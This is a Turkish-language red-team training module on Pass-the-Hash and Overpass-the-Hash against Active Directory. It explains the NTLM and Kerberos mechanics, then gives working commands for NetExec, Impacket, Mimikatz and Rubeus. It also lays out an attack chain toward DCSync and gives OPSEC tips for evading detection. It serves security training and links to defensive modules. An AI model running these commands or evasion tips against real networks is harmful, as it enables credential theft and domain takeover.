## 1. Kavramsal Temel — Neden Var?

NTLM kimlik doğrulamasının kalbinde bir gerçek yatar: **parolanın kendisi asla ağda gitmez — onun yerine NT hash'i bir "kanıt" olarak kullanılır.** Bu, saldırgana devasa bir armağan verir:

> **NTLM'de kimlik doğrulaması için parolayı bilmen gerekmez — NT hash'i bilmen yeterlidir. Hash, parolaya "eşdeğerdir" (password-equivalent). Bir makinenin LSASS'ından çektiğin NT hash ile, o hash'in sahibi olarak başka makinelere hiç kırmadan giriş yaparsın. Buna Pass-the-Hash (PtH) denir.**

**Overpass-the-Hash (OPtH / "pass-the-key")** bunu Kerberos dünyasına taşır: NT hash (veya AES anahtarı) ile bir **TGT** talep edersin → artık NTLM değil, tam Kerberos kimliğine sahipsin. Bu, sadece SMB değil, LDAP/CIFS/HOST gibi tüm Kerberos servislerine kapı açar ve daha "meşru" görünür.

**Analoji:** PtH = birinin imza örneğini (hash) taklit ederek belge imzalamak — imzayı üretmeyi öğrenmene (parolayı kırmana) gerek yok, örneği kopyalaman yeter. OPtH = o imzayla resmi bir kimlik kartı (TGT) çıkartmak; artık her kapıda kart gösterirsin.

## 2. Teknik Derinlik — NTLM Challenge-Response ve Kerberos Anahtarı

### 2.1 Neden hash yeterli? (NTLM mekaniği)

```
   Sunucu doğrulaması sırasında istemci şunu hesaplar:
     response = HMAC-MD5( NT_hash, server_challenge + client_data )
   → Girdi PAROLA değil, doğrudan NT_hash. Parolayı hiç görmeden response üretilir.

   Client (hash elimde)                     Server / DC
     │ NEGOTIATE                              │
     │ ◀── CHALLENGE (nonce) ─────────────────│
     │ AUTHENTICATE = HMAC-MD5(NThash,nonce…) │  ← hash ile hesaplandı
     │ ──────────────────────────────────────▶│  ← DC hash'i bildiğinden doğrular
```

### 2.2 Overpass-the-Hash: hash → Kerberos anahtarı → TGT

```
   NT hash (RC4 key) veya AES256 key
        │  AS-REQ (PA-ENC-TIMESTAMP = E_key(zaman))
        ▼
   AS-REP → TGT  (artık Kerberos kimliği)
        │
        ▼  TGS-REQ ile herhangi bir servise ST al → CIFS/LDAP/HOST/MSSQL...
```

> **RC4 vs AES OPSEC farkı (kritik):** NT hash = RC4 (etype 23) anahtarıdır. AES-zorlamalı bir ortamda **RC4 ile TGT istemek** anomalidir → 4768 etype 0x17 alarmı ([Blue 06.3](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/06.3_AES_Zorlama_RC4_ve_PAC.md)). Bu yüzden mümkünse **AES anahtarıyla** OPtH yap (`sekurlsa::ekeys` ile aldığın aes256 key) — böylece bilet talebin ortamdaki normal AES trafiğiyle aynı görünür.

### 2.3 PtH'nin sınırı: Protected Users ve Credential Guard

- **Protected Users** grubundaki hesaplar NTLM kullanamaz, RC4/DES yasaktır, bilet ömrü kısadır → PtH ve RC4-OPtH çöker ([Blue 03.3](../../2-Blue_Team/Modul_03_Kimlik_Bilgisi_Korumasi/03.3_Protected_Users_ve_Authentication_Policies.md)).
- **Credential Guard** hash'i LSASS'tan çekmeni zaten engeller (kaynak taraf) → [03.2](../Modul_03_Kimlik_Bilgisi_Erisimi/03.2_LSASS_Bellek_Dokumu.md).

### 2.4 LM/NT/AES anahtar sözlüğü — hangi materyal ne yapar

```
   LM hash    : eski, zayıf (7-karakter blokları). Modern AD'de genelde boş
                (LMHASH = aad3b435...). Impacket sözdizimi: LMHASH:NTHASH
   NT hash    : MD4(UTF16-LE(parola)). PtH + RC4-OPtH anahtarı. "password-equivalent"
   AES128/256 : PBKDF2(parola). AES-OPtH anahtarı. RC4 anomalisinden kaçınmak için tercih
   → Boş LM için sözdizimi:  -hashes :<NThash>   (baştaki : = boş LM)
```

### 2.5 PtH neden "yerel admin" gerektirir? (bağlam)

PtH bir NT hash ile **uzak makinede** kimlik doğrular; ama o hash'in sahibinin **hedefte yerel admin** olması gerekir ki ADMIN$/SCM üzerinden iş yapabilsin. Ayrıca **UAC remote restriction** (`LocalAccountTokenFilterPolicy`) nedeniyle, yerel (non-domain) admin hesaplarıyla PtH varsayılan olarak kısıtlıdır — domain hesapları veya yerleşik `Administrator` (RID 500) bu kısıttan muaftır. Bu yüzden RID-500 yerel admin hash'i yanal harekette özellikle değerlidir.

## 3. Pratik Uygulama — Çok Araçlı

### 3.1 Linux'tan PtH (Impacket / NetExec)

```bash
# NetExec — hash ile kimlik doğrula + nerede yerel admin (yatay harita)
nxc smb 10.10.10.0/24 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
#   [+] ... (Pwn3d!)  = o makinede yerel admin

# Impacket araçları -hashes LMHASH:NTHASH kabul eder (LM boşsa aynen)
impacket-psexec corp.local/administrator@10.10.10.42 -hashes :31d6c...089c0
impacket-wmiexec corp.local/administrator@10.10.10.42 -hashes :31d6c...089c0
impacket-smbexec corp.local/administrator@10.10.10.42 -hashes :31d6c...089c0
```

### 3.2 Windows'tan PtH (Mimikatz sekurlsa::pth)

```
:: Yeni bir süreç, kurbanın hash'iyle "damgalanmış" token altında başlar
sekurlsa::pth /user:administrator /domain:corp.local /ntlm:31d6c...089c0 /run:cmd.exe
:: açılan cmd artık administrator olarak ağ kimliği taşır → PsExec/dir \\host\c$
```

### 3.3 Overpass-the-Hash (Rubeus — AES tercihli)

```
:: NT hash yerine AES256 anahtarıyla TGT al (OPSEC: RC4 anomalisinden kaç)
Rubeus.exe asktgt /user:administrator /domain:corp.local /aes256:<aeskey> /ptt
:: /ptt = bileti mevcut oturuma enjekte et → klist ile doğrula
:: sadece NT hash varsa:
Rubeus.exe asktgt /user:administrator /rc4:31d6c...089c0 /ptt
```

```bash
# Impacket getTGT ile OPtH (Linux)
impacket-getTGT corp.local/administrator -hashes :31d6c...089c0
export KRB5CCNAME=administrator.ccache
nxc smb dc01.corp.local -u administrator -k --use-kcache
```

**Örnek çıktı (Rubeus):**
```
[*] Action: Ask TGT
[*] Using aes256_cts_hmac_sha1 hash: ...
[+] TGT request successful!  ticket kirbi enjekte edildi (base64)
[*] klist:  #0  administrator@CORP.LOCAL  krbtgt/CORP.LOCAL  ← geçerli TGT
```

### 3.3.1 AES anahtarını nereden alırım? (OPtH için)

```
:: LSASS'tan AES256 anahtarını çıkar (RC4/NT yerine bunu kullan → sessiz OPtH)
mimikatz> sekurlsa::ekeys
   * Username : administrator
   * aes256_hmac : b7268361...     ← OPtH için /aes256:<bu>
   * rc4_hmac_nt : 31d6cfe0...     ← sadece RC4-only ortamda
```

### 3.4 PtH sonrası hemen genişleme

```bash
# Hash ile secretsdump → o makinedeki tüm yerel + cached hash'ler → yeni hash havuzu
impacket-secretsdump corp.local/administrator@10.10.10.42 -hashes :31d6c...089c0
```

### 3.5 Gerçek-dünya PtH → OPtH zinciri

```
   1) 03.2: SRV05 LSASS → yerel Administrator (RID 500) NT hash
   2) nxc smb /24 -H <hash>  → aynı hash SRV05, SRV12, SRV20'de Pwn3d! (ortak yerel admin!)
   3) SRV12'de secretsdump → cached DOMAIN admin (helpdesk-adm) NT hash + AES key
   4) helpdesk-adm AES key ile OPtH:  Rubeus asktgt /aes256:<key> /ptt
      → RC4 anomalisi YOK (AES ortamıyla uyumlu bilet) → DC'ye Kerberos ile bağlan
   5) helpdesk-adm'in ACL'leri (01.3) → DCSync yolu (Modül 09)
   Ortak yerel admin parolası (LAPS yokluğu) tek hash'i "ana anahtar" yaptı.
```

**OPSEC notları:**
- **NTLM PtH ağda "NTLM" bırakır.** Kerberos zorlanan/izlenen ortamlarda tek bir NTLM 4624 (özellikle iş istasyonları arası — "workstation-to-workstation") kırmızı bayraktır. Mümkünse **OPtH (Kerberos)** tercih et → daha meşru görünür.
- **AES anahtarı kullan, RC4 değil.** `sekurlsa::ekeys` ile AES256 anahtarını al; OPtH'i AES ile yap. RC4 bilet talebi AES-zorlamalı ortamda tek başına yakalanır.
- **Yönetici kimliğinin kaynağına dikkat:** Bir DA hash'iyle **iş istasyonundan** kimlik doğrulamak, o DA'nın normalde asla oturum açmadığı bir makineden geldiği için davranış-analizi (UEBA) tetikler. Jump host gibi "beklenen" kaynaklardan çalış.
- **Protected Users / Authentication Policy Silo** hedefi PtH'a kapatır → hedef bu gruptaysa yol kapalıdır, başka kimlik ara.
- Honeytoken hesaplar ([Blue 04.4](../../2-Blue_Team/Modul_04_Yanal_Hareket_Tespiti/04.4_Honeytoken_ve_Honey_Account.md)): "cazip" ama sahte admin hash'i ile kimlik doğrularsan alarm çalar. Kimliği kullanmadan önce gerçekliğini teyit et.
